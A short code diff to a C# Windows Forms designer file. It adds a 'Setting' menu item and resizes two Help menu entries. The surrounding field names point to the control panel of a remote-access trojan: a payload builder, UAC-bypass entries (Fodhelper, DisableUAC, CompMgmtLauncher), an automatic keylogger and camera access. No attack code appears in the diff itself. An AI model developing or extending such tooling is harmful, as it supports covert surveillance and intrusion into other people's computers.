@@ -120,6 +120,7 @@
             this.FileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.BuilderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.BlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.SettingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.ExitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.HelpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.DocumentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -856,6 +857,7 @@
             this.FileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.BuilderToolStripMenuItem,
             this.BlockToolStripMenuItem,
+            this.SettingToolStripMenuItem,
             this.ExitToolStripMenuItem});
             this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
             this.FileToolStripMenuItem.Size = new System.Drawing.Size(37, 20);
@@ -874,6 +876,13 @@
             this.BlockToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.BlockToolStripMenuItem.Text = "Block";
             this.BlockToolStripMenuItem.Click += new System.EventHandler(this.BlockToolStripMenuItem_Click);
+            // 
+            // SettingToolStripMenuItem
+            // 
+            this.SettingToolStripMenuItem.Name = "SettingToolStripMenuItem";
+            this.SettingToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.SettingToolStripMenuItem.Text = "Setting";
+            this.SettingToolStripMenuItem.Click += new System.EventHandler(this.SettingToolStripMenuItem_Click);
             // 
             // ExitToolStripMenuItem
             // 
@@ -894,14 +903,14 @@
             // DocumentToolStripMenuItem
             // 
             this.DocumentToolStripMenuItem.Name = "DocumentToolStripMenuItem";
-            this.DocumentToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
+            this.DocumentToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.DocumentToolStripMenuItem.Text = "Document";
             this.DocumentToolStripMenuItem.Click += new System.EventHandler(this.DocumentToolStripMenuItem_Click);
             // 
             // AboutToolStripMenuItem
             // 
             this.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem";
-            this.AboutToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
+            this.AboutToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.AboutToolStripMenuItem.Text = "About";
             this.AboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem1_Click);
             // 
@@ -1292,6 +1301,7 @@
         private System.Windows.Forms.ToolStripMenuItem FodhelperToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem DisableUACToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem CompMgmtLauncherToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem SettingToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem autoKeyloggerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem SchtaskUninstallToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader lv_camera;
